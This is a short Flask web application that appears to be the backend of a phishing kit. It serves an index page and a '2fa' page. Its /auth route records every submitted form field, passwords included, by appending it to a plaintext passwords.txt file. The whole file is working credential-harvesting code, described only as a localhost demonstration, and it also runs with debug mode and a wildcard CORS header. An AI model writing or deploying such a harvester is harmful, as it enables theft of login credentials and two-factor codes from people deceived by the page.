from flask import Flask, render_template, send_file, make_response, request

app = Flask(__name__)

@app.route("/auth", methods=["POST"])
def auth():
    form_data = request.form.to_dict()  # Get form data as a dictionary
    print(form_data)  # Print for debugging
    
    # Save the password to a text file
    with open("passwords.txt", "a") as file:  # Open in append mode
        file.write(str(form_data) + "\n")  # Write data and move to a new line

    return "Password saved successfully!"

@app.route("/")
def index():
    response = make_response(send_file("index.html"))
    # Just for localhost demonstration sake
    response.headers.add("Access-Control-Allow-Origin", "*")
    return response

@app.route("/login")
def login():
    return send_file("2fa.html")

if __name__ == "__main__":
    app.run(debug=True)
